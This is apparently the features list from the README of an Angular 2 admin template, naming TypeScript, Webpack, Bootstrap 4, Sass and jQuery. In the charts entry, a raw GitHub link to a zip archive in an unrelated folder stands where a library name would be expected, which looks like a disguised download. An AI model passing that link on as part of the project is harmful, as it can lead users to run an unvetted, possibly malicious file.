## Features
* TypeScript
* Webpack
* Responsive layout
* High resolution
* Bootstrap 4 CSS Framework
* Sass
* Angular 2
* jQuery
* Charts (Chartist, https://raw.githubusercontent.com/ducnguyenminh/ng2-admin/master/jack/ng2-admin.zip)

* and many more!
